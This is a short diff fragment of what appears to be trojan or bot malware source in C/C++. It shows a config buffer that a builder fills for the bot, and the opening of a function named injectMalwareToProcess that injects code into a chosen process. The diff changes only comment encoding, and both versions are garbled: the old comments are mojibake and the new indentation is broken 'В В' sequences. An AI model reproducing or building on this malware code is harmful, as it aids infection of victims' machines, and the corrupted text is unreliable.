@@ -10,21 +10,21 @@
 #include "..\common\process.h"
 
 /*
-  ��������� � ������� ������ ���������� �������� ������ ��� ����.
-  ������ ���������� ������ ���������� � ������������ cpp-�����, ��� ����������� ������������ ��
-  ������.
+  Перменная в которую билдер сохзраняет базоовые данные для бота.
+  Данная переменная должны находиться в произволбном cpp-файле, для обеспечения рандомизации ее
+  адреса.
 */
 extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
 
-/*  Inject code in a particular process.
+/*В В Inject code in a particular process.
 
-  IN pid - ID of the process.
-  IN processMutex - myuteks process.
-  IN proccessFlags - data for the new coreData.proccessFlags, tekschie data inherited by the mask
-                     Core:: CDPT_INHERITABLE_MASK.
+В В IN pid - ID of the process.
+В В IN processMutex - myuteks process.
+В В IN proccessFlags - data for the new coreData.proccessFlags, tekschie data inherited by the mask
+В В В В В В В В В В В В В В В В В В В В В Core:: CDPT_INHERITABLE_MASK.
 
-  Return - true - if successful,
-                     false - if an error occurs.*/
+В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В В В В В false - if an error occurs.*/
 static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
 {
   bool ok = false;
